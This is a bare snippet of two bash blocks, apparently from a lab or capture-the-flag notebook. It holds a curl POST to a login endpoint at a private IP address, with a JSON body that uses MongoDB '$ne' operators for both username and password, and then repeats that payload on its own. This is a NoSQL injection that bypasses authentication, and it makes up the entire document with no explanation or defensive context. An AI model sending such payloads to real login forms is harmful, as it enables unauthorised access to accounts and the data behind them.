
```bash
curl -v -i -X POST http://10.67.182.177/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

```bash
{"username":{"$ne":""},"password":{"$ne":""}}
```
